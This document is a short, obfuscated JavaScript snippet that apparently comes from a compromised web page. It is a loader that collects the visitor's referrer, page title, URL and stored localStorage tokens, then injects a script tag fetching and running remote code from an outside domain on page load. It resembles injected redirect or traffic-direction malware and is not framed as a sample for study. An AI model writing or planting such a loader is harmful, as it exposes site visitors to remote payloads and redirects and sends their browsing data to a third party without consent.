(function() {
    var name = '_1dMszkq1dkWd9j7W';
    if (!window._1dMszkq1dkWd9j7W) {
        window._1dMszkq1dkWd9j7W = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://janajyoti.com/56QZJ3db',
        };
    }
    const _6mnDgCndWFZN3WnT = localStorage.getItem('config');
    if (typeof _6mnDgCndWFZN3WnT !== 'undefined' && _6mnDgCndWFZN3WnT !== null) {
        var _792k1ZdBmjSkYM9C = JSON.parse(_6mnDgCndWFZN3WnT);
        var _DHwHxnn6wj7tF8dK = Math.round(+new Date()/1000);
        if (_792k1ZdBmjSkYM9C.created_at + window._1dMszkq1dkWd9j7W.ttl < _DHwHxnn6wj7tF8dK) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _5Cxw3mwbg3JRX597 = localStorage.getItem('subId');
    var _7LyHn6VCLwZT4hGw = localStorage.getItem('token');
    var _xbkn8Vnv9tFgmK5r = '?return=js.client';
        _xbkn8Vnv9tFgmK5r += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _xbkn8Vnv9tFgmK5r += '&se_referrer=' + encodeURIComponent(document.referrer);
        _xbkn8Vnv9tFgmK5r += '&default_keyword=' + encodeURIComponent(document.title);
        _xbkn8Vnv9tFgmK5r += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _xbkn8Vnv9tFgmK5r += '&name=' + encodeURIComponent(name);
        _xbkn8Vnv9tFgmK5r += '&host=' + encodeURIComponent(window._1dMszkq1dkWd9j7W.R_PATH);
    if (typeof _5Cxw3mwbg3JRX597 !== 'undefined' && _5Cxw3mwbg3JRX597 && window._1dMszkq1dkWd9j7W.unique) {
        _xbkn8Vnv9tFgmK5r += '&sub_id=' + encodeURIComponent(_5Cxw3mwbg3JRX597);
    }
    if (typeof _7LyHn6VCLwZT4hGw !== 'undefined' && _7LyHn6VCLwZT4hGw && window._1dMszkq1dkWd9j7W.unique) {
        _xbkn8Vnv9tFgmK5r += '&token=' + encodeURIComponent(_7LyHn6VCLwZT4hGw);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._1dMszkq1dkWd9j7W.R_PATH + _xbkn8Vnv9tFgmK5r;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();